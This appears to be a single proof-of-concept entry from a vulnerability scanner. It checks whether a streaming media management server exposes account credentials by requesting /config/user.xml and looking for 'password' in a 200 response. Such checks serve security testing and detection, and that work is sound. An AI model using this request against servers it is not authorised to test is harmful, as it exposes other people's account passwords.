{
        'name': '流媒体管理服务器 /config/user.xml 账号密码泄漏',
        'poc':[{'requests':{
            'method': 'get',
            'payload': '/config/user.xml',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            },
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': 200,
            'text': 'password'
        }}]
    }